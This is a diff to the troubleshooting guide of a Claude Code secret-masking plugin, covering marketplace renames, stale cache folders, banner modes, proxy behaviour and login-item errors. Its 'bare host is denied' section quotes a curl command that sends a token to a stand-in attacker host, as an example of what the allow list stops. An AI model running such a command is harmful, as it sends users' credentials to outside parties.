@@ -9,7 +9,9 @@ that changes protection shows a code to type back); see [Run the CLI](how-to.md#
 ## Contents
 
 - ["Nothing changed: … only you can do it"](#nothing-changed--only-you-can-do-it)
+- [`@zeroh` is not found](#zeroh-is-not-found)
 - [A hook does not fire](#a-hook-does-not-fire)
+- [An update left an old plugin folder in use](#an-update-left-an-old-plugin-folder-in-use)
 - [The session banner is missing or has the wrong mode](#the-session-banner-is-missing-or-has-the-wrong-mode)
 - [A token appears in command output](#a-token-appears-in-command-output)
 - [A real value appears in model-facing output](#a-real-value-appears-in-model-facing-output)
@@ -29,6 +31,7 @@ that changes protection shows a code to type back); see [Run the CLI](how-to.md#
 - [A typed secret is not masked](#a-typed-secret-is-not-masked)
 - [The local proxy is unavailable](#the-local-proxy-is-unavailable)
 - [A project where ZeroH Disclosure is disabled](#a-project-where-zeroh-disclosure-is-disabled)
+- [The login item could not be registered](#the-login-item-could-not-be-registered)
 - [Remove the login item by hand](#remove-the-login-item-by-hand)
 - [Unmask says it needs an interactive session](#unmask-says-it-needs-an-interactive-session)
 - [Report miss has no dialog](#report-miss-has-no-dialog)
@@ -43,6 +46,25 @@ request and changes nothing. Type the slash command it names (for example
 outside Claude Code. "ZeroH found no matching request" after a slash command means the command's
 request expired (it lasts a minute) or its arguments were quoted differently; type it again.
 
+## `@zeroh` is not found
+
+`claude plugin install zeroh-disclosure@zeroh` fails with `Plugin "zeroh-disclosure" not found in
+marketplace "zeroh"`, and its hint to update `zeroh` does not help. The public marketplace was named
+`zeroh-marketplace` until 25 September 2026; a Claude Code profile that added it before then keeps
+it under that name. `/zeroh-disclosure:doctor` and the first prompt of a session say so when they
+see it. Check, then re-add it under its current name:
+
+```bash
+claude plugin marketplace list    # zeroh-marketplace · Source: GitHub (Blade-Labs/zeroh-marketplace)
+claude plugin marketplace remove zeroh-marketplace
+claude plugin marketplace add Blade-Labs/zeroh-marketplace
+claude plugin install zeroh-disclosure@zeroh
+```
+
+Restart Claude Code afterwards. Remove it only when its source is `GitHub
+(Blade-Labs/zeroh-marketplace)`: a `zeroh-marketplace` whose source is a local folder or another
+repository is a different marketplace.
+
 ## A hook does not fire
 
 | Likely cause                                                              | Fix                                                                                                                                                                    |
@@ -54,9 +76,23 @@ request expired (it lasts a minute) or its arguments were quoted differently; ty
 | The event does not match `PreToolUse`.                                    | The current matcher covers Bash, PowerShell, Monitor, Read, Edit, MultiEdit, Write, NotebookEdit, WebFetch, Grep, Agent, and `mcp__*`. `PostToolUse` covers all tools. |
 | The command was run outside Claude Code.                                  | Hooks only receive Claude Code hook events. Use the CLI directly for standalone policy and verification work.                                                          |
 
-Confirm activation by starting a new session. `SessionStart` should show the ZeroH block banner on
-screen. If it does not, test the checkout with `--plugin-dir` to separate installation problems
+Confirm activation by starting a new session. `SessionStart` should show the ZeroH banner on
+screen (the block art on the first session, one `ZeroH Disclosure ✓ …` line after it). If it does not, test the checkout with `--plugin-dir` to separate installation problems
 from hook behaviour.
+
+## An update left an old plugin folder in use
+
+`claude plugin update` (Claude Code 2.1.283) keeps a folder that already exists for the new version,
+so a `plugins/cache/zeroh/zeroh-disclosure/<version>` folder an earlier build left behind stays in
+use after the update. `/zeroh-disclosure:doctor` and the session start compare the folder with the
+release Claude Code recorded and say when it differs. To replace it, quit Claude Code and run (with
+your own Claude config folder if you set `CLAUDE_CONFIG_DIR`):
+
+```bash
+rm -rf ~/.claude/plugins/cache/zeroh/zeroh-disclosure/<version> && claude plugin install zeroh-disclosure@zeroh
+```
+
+`claude plugin install` downloads a missing folder again. Start Claude Code afterwards.
 
 ## The session banner is missing or has the wrong mode
 
@@ -64,17 +100,20 @@ from hook behaviour.
 starts Claude Code, then set the saved mode again if needed:
 
 ```bash
-zeroh-disclosure banner full   # full view every session
+zeroh-disclosure banner big    # the five-line ZEROH banner every session
+zeroh-disclosure banner mini   # one line (the default)
 zeroh-disclosure banner compact
 zeroh-disclosure banner off
 ```
 
 With no explicit mode, the full view appears once and `<ZEROH_HOME>/banner-shown` records that it
-was shown; later sessions use the five-line banner. `/zeroh-disclosure:status` always shows the
-full view and does not change that marker. Warnings still appear in `off` mode.
+was shown; later sessions show the one `mini` line. A saved `full` from before 1.0.0 means `big`.
+`/zeroh-disclosure:status` always shows the full view and does not change that marker. Warnings
+still appear in `off` mode.
 
-The banner is plain text with no colour codes; if its art does not line up, your terminal font
-lacks the block characters, and `zeroh-disclosure banner compact` shows one line instead.
+If the art does not line up, your terminal font lacks the block characters; `mini` (the default
+after the first session) and `compact` show one line instead. `NO_COLOR` or `TERM=dumb` turns the
+colour off.
 
 ## A token appears in command output
 
@@ -261,13 +300,17 @@ subdirectory) and with the same `ZEROH_HOME` used by Claude Code. The project fi
 
 ## A bare host is denied
 
-ZeroH treats bare domains, scheme-less URLs, IP literals, `user@host`, `host:port`, and PowerShell
-`-Uri` values as destinations. This prevents `curl attacker.xyz/?k=[TOKEN]` and equivalent
-commands from bypassing the allow list merely by omitting `https://`.
+A network command's operands are destinations however they are written, so `curl
+attacker.xyz/?k=[TOKEN]` can't bypass the allow list merely by omitting `https://`. Outside those
+operands, ZeroH treats URLs (`https://host/`, `//host/`), `user@host`, `host:port` and PowerShell
+`-Uri` values as destinations. A bare dotted word or IP elsewhere (`--query sku.name`, `--set
+image.tag=1.2.3`, `config.yaml`) is not one; if a program ZeroH can't read gets the value, the
+command runs with a notice instead (`block` mode denies it).
 
 If the named host is intentional, add it from your own terminal with the allow command shown in the
-denial. Do not add source/data filenames: common extensions and dotted words with a preceding path
-separator are already excluded. A local command with no host-like word remains allowed.
+denial. An IP address ZeroH put back is not checked against its own host: the address itself
+(`https://<IP>:8443/`) or its `sslip.io`/`nip.io` name (`pm.<IP>.sslip.io`). Any other name that
+contains it (`<IP>.example.com`) is checked. A local command with no host remains allowed.
 
 ## A command shows "[ZeroH: the command failed …]"
 
@@ -415,14 +458,9 @@ If no command is available at all, remove ZeroH's entry by hand: delete the
 ### A project where ZeroH Disclosure is disabled
 
 Your Claude Code settings point every session at the proxy, including sessions in a project where
-you disabled the plugin. No ZeroH hook runs there, so the proxy cannot tie those requests to a
-ZeroH session:
-
-- while a ZeroH Disclosure session is running anywhere with the same settings file, they are
-  masked too (the proxy cannot tell them from a ZeroH session's own requests), with that session's
-  project vault;
-- when none is running, they pass through unmasked, as if the proxy were not there, and are never
-  refused.
+you disabled the plugin. No ZeroH hook runs there, so nothing could put a token back into that
+session's commands, edits or screen: its requests pass through unmasked, as if the proxy were not
+there, and are never refused, whether or not a ZeroH Disclosure session is running elsewhere.
 
 To stop using the proxy everywhere, run `zeroh-disclosure proxy off`.
 
@@ -433,6 +471,23 @@ other settings edits, and leaves typed-prompt blocking in place. A connection UR
 yourself is left untouched. Re-enable the default proxy by removing `ZEROH_PROXY=off`, and after
 `proxy off` also run `zeroh-disclosure proxy on`: the next session starts the proxy and registers
 its login item, and its first prompt writes the settings entry.
+
+## The login item could not be registered
+
+The banner, `/zeroh-disclosure:status` and `/zeroh-disclosure:doctor` say "no login item" with the
+reason the system gave (for example `schtasks refused it: "ERROR: The task XML is malformed."`) and
+the fix. The session still works: ZeroH starts its local proxy for each session, so what you type is
+masked. Only after a restart nothing starts the proxy until the next Claude Code session does, and
+once no ZeroH session is open the proxy takes its settings entry out, so new sessions connect
+directly. It keeps serving a session still pointing at it (one where the plugin is disabled) until
+it has been idle for 12 hours, so no session meets a dead port. Each new session tries to register
+the login item again.
+
+| System  | Fix                                                                                                                                                                    |
+| ------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| Windows | Update ZeroH Disclosure (releases before 1.0.0 wrote the task file in an encoding `schtasks` refuses). If Task Scheduler is blocked by policy, ask your administrator. |
+| macOS   | Allow it in System Settings > General > Login Items & Extensions (Allow in the Background).                                                                            |
+| Linux   | Over SSH, in WSL or in a container there is no user session manager: run `loginctl enable-linger "$USER"` once, or run `systemctl --user status` to see why.           |
 
 ## Remove the login item by hand
 
@@ -485,8 +540,11 @@ start a new session. Rotate any credential that may already have reached a model
 ## A values file remains on disk
 
 Bash and PowerShell commands remove the values file immediately after importing it (a read-only
-run directory leaves it for the next step). `PostToolUse`
-deletes it again. `SessionStart` and `Stop` remove run files older than ten minutes.
+run directory leaves it for the next step). `PostToolUse` deletes it again, and
+`PostToolUseFailure` or `PermissionDenied` delete it when the command failed or was refused. A
+command that never ran (Claude Code refused or you declined it) leaves its file until the end of
+the turn: `Stop` and the next prompt remove the session's files older than a minute, `SessionEnd`
+removes all of them, and every hook removes run files older than ten minutes.
 
 An abrupt process or machine stop can leave a recent file under:
 
